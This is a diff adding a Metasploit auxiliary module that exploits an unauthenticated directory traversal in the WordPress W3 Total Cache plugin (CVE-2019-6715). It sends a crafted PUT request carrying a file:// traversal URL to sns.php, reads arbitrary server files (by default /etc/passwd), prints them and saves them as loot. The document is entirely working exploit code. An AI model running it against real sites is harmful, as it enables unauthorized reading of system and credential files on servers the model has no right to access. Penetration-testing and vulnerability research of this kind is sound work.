@@ -1,0 +1,86 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+#
+##
+
+class MetasploitModule < Msf::Auxiliary
+include Msf::Auxiliary::Report
+include Msf::Exploit::Remote::HTTP::Wordpress
+include Msf::Auxiliary::Scanner
+
+def initialize(info = {})
+super(
+update_info(
+info,
+'Name' => 'WordPress W3 Total Cache File Read Vulnerability',
+'Description' => %q{
+This module exploits an unauthenticated directory traversal vulnerability
+in WordPress plugin
+'W3 Total Cache' version 0.9.2.6-0.9.3, allowing arbitrary file read with
+the web server privileges.
+},
+'References' =>
+[
+['CVE', '2019-6715'],
+['WPVDB', '9248'],
+['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2019-6715'],
+['URL','https://vinhjaxt.github.io/2019/03/cve-2019-6715'],
+],
+'Author' =>
+[
+'VinhJAXT', # Vulnerability discovery
+'Hoa Nguyen - SunCSR Team' # Metasploit module
+],
+'DisclosureDate' => '2014-09-20',
+'License' => MSF_LICENSE
+)
+)
+
+register_options(
+[
+OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
+OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 2])
+]
+)
+end
+
+def check
+check_plugin_version_from_readme('w3-total-cache', '0.9.4', '0.9.26')
+end
+
+def run_host(ip)
+traversal = '../' * datastore['DEPTH']
+filename = datastore['FILEPATH']
+filename = filename[1, filename.length] if filename =~ %r{^/}
+
+json_body = { 'Type' => "SubscriptionConfirmation",
+'Message' => '',
+'SubscribeURL' => "file:///#{traversal}#{filename}"
+}
+
+res = send_request_cgi({
+'method' => 'PUT',
+'uri' => normalize_uri(wordpress_url_plugins, 'w3-total-cache', 'pub','sns.php'),
+'ctype' => 'application/json',
+'data' => JSON.generate(json_body)
+})
+
+fail_with Failure::Unreachable, 'Connection failed' unless res
+fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' unless res.code == 200
+fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.length.zero?
+
+print_status('Downloading file...')
+print_line("\n#{res.body}\n")
+
+fname = datastore['FILEPATH']
+path = store_loot(
+'w3_total_cache.traversal',
+'text/plain',
+ip,
+res.body,
+fname
+)
+print_good("File saved in: #{path}")
+end
+end
